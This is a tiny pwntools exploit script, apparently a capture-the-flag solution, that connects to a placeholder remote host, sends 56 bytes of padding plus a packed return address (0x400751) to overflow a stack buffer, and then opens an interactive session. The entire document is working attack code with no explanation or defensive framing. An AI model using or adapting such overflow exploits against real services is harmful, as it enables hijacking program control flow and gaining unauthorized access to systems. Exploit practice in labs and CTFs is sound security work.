from pwn import *

io = remote('<IP address>', port);
io.recv()
io.send(b'A' * 56 + p64(0x400751))
io.interactive()